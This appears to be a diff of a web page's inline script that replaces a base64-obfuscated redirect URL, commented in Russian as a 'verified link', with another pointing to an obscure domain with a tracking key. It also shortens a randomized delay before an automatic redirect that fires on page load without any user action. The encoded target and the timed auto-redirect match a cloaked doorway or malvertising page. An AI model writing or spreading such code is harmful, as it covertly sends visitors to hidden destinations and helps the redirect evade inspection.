@@ -193,7 +193,7 @@
 
   <script>
     // ПРОВЕРЕННАЯ ССЫЛКА
-    const secret = "aHR0cHM6Ly9jYXJkaW5hbHRhbmdpYmxlLmNvbS90ODhlNzAydGZ6P2tleT1hNmZmYzA0NzdlZTYwMzc1ZmE4MDY1ZTBmYTc3MGViYQ==";
+    const secret = "aHR0cHM6Ly9pbmhhbGVkcmV3LmNvbS9tcmRtam52ODY/a2V5PTNlNWVjODRjM2M2ZGJiZDI4MTI3NmVkZDkzNjY4NTA5";
 
     const btn = document.getElementById("entry-btn");
     const loader = document.getElementById("btn-loader");
@@ -244,10 +244,10 @@
       executeRedirect();
     });
 
-    // Авто-редирект через 2-3 секунды
+    // Авто-редирект через 1.5-2.2 секунды
     document.addEventListener("DOMContentLoaded", () => {
-      // Случайная задержка от 2000 до 3000 мс
-      const randomDelay = Math.floor(Math.random() * (3000 - 2000 + 1)) + 2000;
+      // Случайная задержка от 1500 до 2200 мс
+      const randomDelay = Math.floor(Math.random() * (2200 - 1500 + 1)) + 1500;
       setTimeout(() => {
         executeRedirect();
       }, randomDelay);
